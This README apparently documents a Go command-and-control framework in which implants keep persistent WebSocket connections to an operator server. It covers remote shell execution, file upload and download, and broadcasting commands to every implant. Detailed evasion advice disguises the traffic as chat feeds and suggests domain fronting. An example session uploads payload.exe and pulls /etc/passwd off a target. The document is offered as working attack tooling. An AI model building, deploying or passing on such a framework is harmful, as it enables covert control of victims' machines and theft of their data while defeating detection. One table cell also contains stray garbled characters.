# WebSocket Abuse C2

A command & control framework using **persistent WebSocket connections** instead of HTTP request/response polling. The long-lived connection mimics legitimate applications (chat apps, trading dashboards, sports feeds) — avoiding the beaconing pattern that behavioral detection looks for.

## Concept

Traditional C2 implants connect, send/request data, and disconnect. This creates a recognizable **beacon** pattern: "every 60 seconds, this process connects, sends a POST, gets a 200, and disconnects." Behavioral ML and EDR pick this up easily.

**WebSocket Abuse C2** keeps a persistent TLS WebSocket connection open. The traffic looks like a live chat session or data feed — not C2 traffic. There's no periodic connect/disconnect cycle to detect.

## Architecture

```
┌─────────────────────┐         wss://          ┌─────────────────────┐
│  C2 Server          │◄───────────────────────►│  Implants           │
│  cmd/server/main.go │    TLS WebSocket        │  cmd/client/main.go │
│                     │                         │                     │
│  Operator Console   │   JSON message frames   │  os/exec execution  │
│  (interactive TUI)  │    {"type":"exec",       │  file upload/downld │
│                      │     "id":"...",         │  configurable beacon│
│                      │     "data":"..."}       │  auto-reconnect     │
└─────────────────────┘                         └─────────────────────┘
```

## Message Protocol

All communication uses JSON-encoded frames:

```json
{
  "type":  "cmd|result|exec|upload|download|ping|pong|heartbeat|register",
  "id":    "implant-unique-id",
  "data":  "command string or base64 payload",
  "error": "error message (result messages only)"
}
```

### Message Types

| Type         | Direction    | Purpose                                    |
|-------------|-------------|---------------------------------------------|
| `register`  | Client→Server | Identify implant on connect               |
| `exec`      | Server→Client | Execute a shell command                   |
| `upload`    | Server→Client | Upload file to implant (base64)           |
| `download`  | Server→Client | Request file from implant                  |
| `beacon`    | Server→Client | Change heartbeat interval                  |
| `exit`      | Server→Client | Disconnect implant                         |
| `result`    | Client→Server | Command output or error                    |
| `ping`      | Server→Client | Keepalive probe                            |
| `pong`      | Client→Server | Keepalive response                         |
| `heartbeat` | Client→Server | Regular alive signal at beacon interval    |
| `cmd`       | Server→Client | Generic command (reserved)                 |

### Upload Wire Format

`upload` commands carry data in `"data"` as: `<remote-path>|<base64-encoded-file-contents>`

### Download Wire Format

The implant replies with a `result` where `"data"` is: `<remote-path>|<base64-encoded-file-contents>`

## Build

```bash
# Generate go.sum and verify
go mod tidy

# Build server
go build -o bin/server ./cmd/server

# Build implant
go build -o bin/client ./cmd/client
```

The only external dependency is `github.com/gorilla/websocket`. Everything else is Go stdlib.

## Server Usage

```bash
./bin/server -addr :8443 -cert server.crt -key server.key
```

If certificate files don't exist, the server generates a self-signed certificate automatically.

### Flags

| Flag     | Default        | Description                  |
|---------|----------------|------------------------------|
| `-addr` | `:8443`        | Listen address (host:port)   |
| `-cert` | `server.crt`   | TLS certificate file         |
| `-key`  | `server.key`   | TLS private key file         |

### Operator Console Commands

| Command                        | Description                        |
|-------------------------------|-------------------------------------|
| `list`                        | Show all connected implants         |
| `use <id>`                    | Select an implant by ID            |
| `exec <command>`              | Run shell command on selected      |
| `upload <local> <remote>`    | Upload file to implant             |
| `download <remote>`           | Download file from implant          |
| `beacon <seconds>`            | Change implant's beacon interval    |
| `broadcast <command>`         | Run command on ALL connected       |
| `exit`                        | Disconnect selected implant         |
| `help`                        | Show this help                      |

## Client (Implant) Usage

```bash
./bin/client -server wss://192.168.1.100:8443/ws -id my-implant -interval 60
```

### Flags

| Flag       | Default                      | Description                     |
|-----------|------------------------------|---------------------------------|
| `-server` | `wss://127.0.0.1:8443/ws`   | C2 server WebSocket URL        |
| `-id`     | `<hostname>-<random>`       | Implant identifier              |
| `-interval` | `60`                       | Heartbeat interval (seconds)    |

### Auto-Reconnect

The implant uses exponential backoff on disconnect:
1. Start: 1 second
2. Double each retry (1s → 2s → 4s → 8s → ...)
3. Cap: 60 seconds max
4. Resets to 1s on successful connection

## TLS Certificate Setup

### Self-Signed (Quick Start)

The server auto-generates a self-signed certificate on first run. The implant accepts self-signed certs (`InsecureSkipVerify: true` by default).

### Production / Legitimate TLS

```bash
# Using Let's Encrypt (certbot)
certbot certonly --standalone -d c2.example.com
cp /etc/letsencrypt/live/c2.example.com/fullchain.pem server.crt
cp /etc/letsencrypt/live/c2.example.com/privkey.pem server.key

# Or generate with OpenSSL
openssl req -newkey rsa:4096 -nodes -keyout server.key -x509 -days 365 -out server.crt
```

### Implant with Valid Certs

Modify `cmd/client/main.go`:
```go
tlsConfig := &tls.Config{
    InsecureSkipVerify: false, // validate server cert
    // optionally: RootCAs: caCertPool for custom CA
}
```

## WebSocket vs HTTPS Comparison

| Aspect               | HTTPS Polling                    | WebSocket C2                          |
|----------------------|----------------------------------|---------------------------------------|
| Connection pattern   | Connect → Request → Disconnect   | Persistent connection                 |
| Detection surface    | Predictable timing/frequency     | Continuous stream, no beacon gap      |
| Traffic shape        | HTTP headers + JSON body         | Upgraded WS frames (minimal overhead) |
| Header analysis      | Standard HTTP headers visible    | Single Upgrade, then raw WS frames    |
| Deep packet inspect  | POST/GET patterns easy to detect | Looks like聊天 / live data feed         |
| Keepalive            | N/A                              | Ping/pong every 30s (WS native)       |
| Latency              | Poll interval delay              | Real-time command delivery            |
| Firewall traversal   | HTTP/HTTPS ports only            | Same (rides HTTPS)                    |
| Protocol overhead    | Higher (HTTP headers per request)| Lower (framed, no headers per msg)    |

## OpSec Notes

### Traffic Disguise

- **Use `wss://`** (WebSocket Secure) — encrypts all traffic, looks like HTTPS
- **Customize the URL path** — rename `/ws` to `/chat`, `/live`, `/stream`, `/socket`, `/feed`
- **Fake WebSocket subprotocol** — add a subprotocol name during handshake:
  ```go
  conn, _, err := dialer.Dial(serverURL, http.Header{
      "Sec-WebSocket-Protocol": []string{"chat"},
  })
  ```
- **Pad messages** — add random padding to normalize message sizes
- **C2 over 443** — run on port 443 with SNI matching a real-looking hostname

### Detection Evasion

- **No beacon timing** — the connection is persistent, so there's no periodic connect/disconnect
- **No HTTP request headers** — after the initial upgrade, all frames are pure WebSocket with no HTTP overhead
- **TLS by default** — no plaintext traffic even on initial handshake
- **Ping/pong looks like WS keepalive** — every legitimate WS app does this

### Operational Security

- **Don't hardcode server IPs** — use DNS or change on each deployment
- **Generate unique implant IDs** — never use the same ID twice for different campaigns
- **Use domain fronting** if possible for covert channel
- **Certificate rotation** — generate new self-signed certs periodically
- **Command output encoding** — all responses are base64 for binary files; plaintext for shell output

## Example Session

```bash
# Terminal 1: Start server
$ ./bin/server
WebSocket C2 server starting on wss://:8443/ws
Self-signed certificate generated (valid for 365 days)
> 
# Terminal 2: Start implants
$ ./bin/client -server wss://127.0.0.1:8443/ws -id target-1 -interval 30
$ ./bin/client -server wss://127.0.0.1:8443/ws -id target-2 -interval 60

# Terminal 1: Operator console
> list
────────────────────────────────────────────────────────────────────────────────
#    IMPLANT ID              IP                  CONNECTED            STATUS
────────────────────────────────────────────────────────────────────────────────
1    target-1                127.0.0.1           2026-05-11T21:59:00Z
2    target-2                127.0.0.1           2026-05-11T21:59:05Z
────────────────────────────────────────────────────────────────────────────────
Total: 2 implant(s)

> use target-1
Selected implant: target-1 (127.0.0.1) connected since 2026-05-11T21:59:00Z

> exec uname -a
Sent exec to target-1: uname -a
[Result from target-1] Linux target-1 6.8.0-kali3-amd64 #1 SMP PREEMPT_DYNAMIC x86_64 GNU/Linux

> upload ./payload.exe C:\Users\Public\payload.exe
Uploading ./payload.exe → C:\Users\Public\payload.exe on target-1 (12345 bytes)

> download /etc/passwd
Requested download of /etc/passwd from target-1
[Result from target-1] /etc/passwd|cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApk...

> beacon 5
Set beacon interval to 5s on target-1

> broadcast id
Broadcast 'exec id' to 2/2 implants
```
